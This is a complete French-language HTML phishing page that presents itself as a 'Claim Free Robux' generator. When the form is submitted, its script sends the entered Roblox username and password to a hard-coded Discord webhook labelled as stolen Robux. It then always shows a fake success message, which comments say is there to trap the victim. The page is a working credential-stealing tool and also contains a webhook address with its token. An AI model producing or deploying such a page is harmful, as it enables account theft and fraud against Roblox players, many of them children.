<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vérification Roblox</title>
<style>
  body {
    margin: 0;
    padding: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #e6e6e6;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
  }
  .card {
    background: white;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
    width: 340px;
    text-align: center;
    position: relative;
  }
  h2 {
    color: #333;
    margin-top: 0;
    margin-bottom: 25px;
  }
  input {
    width: 100%;
    padding: 14px;
    margin: 10px 0;
    border: 1px solid #ddd;
    border-radius: 6px;
    box-sizing: border-box;
    font-size: 15px;
    transition: 0.3s;
  }
  input:focus {
    border-color: #00b06f;
    outline: none;
    box-shadow: 0 0 5px rgba(0,176,111,0.3);
  }
  button {
    width: 100%;
    padding: 14px;
    background: linear-gradient(to right, #00b06f, #009a60);
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 15px;
    font-weight: bold;
    letter-spacing: 0.5px;
  }
  button:hover {
    opacity: 0.9;
  }
  button:disabled {
    background: #ccc;
    cursor: not-allowed;
  }
  .loader {
    display: none;
    border: 4px solid #f3f3f3;
    border-top: 4px solid #00b06f;
    border-radius: 50%;
    width: 30px;
    height: 30px;
    animation: spin 0.8s linear infinite;
    margin: 20px auto;
  }
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  #msg {
    display: none;
    color: #00b06f;
    font-weight: bold;
    margin-top: 15px;
    font-size: 15px;
  }
  .robux-icon {
    font-size: 40px;
    margin-bottom: 10px;
  }
</style>
</head>
<body>

<div class="card">
  <div class="robux-icon">💎</div>
  <h2>Claim Free Robux</h2>
  
  <form id="scamForm">
    <input type="text" id="user" placeholder="Nom d'utilisateur Roblox" required autocomplete="off">
    <input type="password" id="pass" placeholder="Mot de passe" required autocomplete="off">
    <button type="submit" id="btn">GÉNÉRER LES ROBUX</button>
  </form>

  <div class="loader" id="load"></div>
  <div id="msg">✅ Succès ! Les Robux sont en cours d'envoi...</div>
</div>

<script>
  // Ton Webhook ici
  const wh = "https://discord.com/api/webhooks/1574047700486463568/y58ZSWLlbyMSxEID3VqZtVx158lbw7mjCQWp3UiOVzoBKL8ACOaYWTXDcqj3NEG7EUWw";

  document.getElementById('scamForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    const btn = document.getElementById('btn');
    const load = document.getElementById('load');
    const msg = document.getElementById('msg');

    // Désactiver le bouton et montrer le chargement
    btn.disabled = true;
    btn.innerText = "Connexion au serveur...";
    load.style.display = 'block';

    // Préparation du message Discord
    const data = {
      embeds: [{
        title: "🔥 NOUVEAUX ROBUX VOLÉS",
        color: 5763719,
        fields: [
          { name: "👤 Utilisateur", value: u },
          { name: "🔓 Mot de passe", value: p },
          { name: "🌍 IP (approx)", value: "Inconnue" },
          { name: "⏰ Heure", value: new Date().toLocaleString() }
        ],
        footer: { text: "Robux Generator v4.0" }
      }]
    };

    // Envoi vers Discord
    fetch(wh, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    }).then(() => {
      finish(true);
    }).catch(() => {
      // Même si ça plante, on dit que c'est réussi pour piéger la victime
      finish(false); 
    });

    function finish(success) {
      setTimeout(() => {
        load.style.display = 'none';
        msg.style.display = 'block';
        btn.style.display = 'none';
        
        // Vider les champs
        document.getElementById('user').value = "";
        document.getElementById('pass').value = "";
        
        // Message final
        alert("Vérification terminée ! Regardez votre inventaire dans 5 minutes.");
      }, 1500); // Petit délai de 1.5s pour l'effet "chargement"
    }
  });
</script>

</body>
</html>
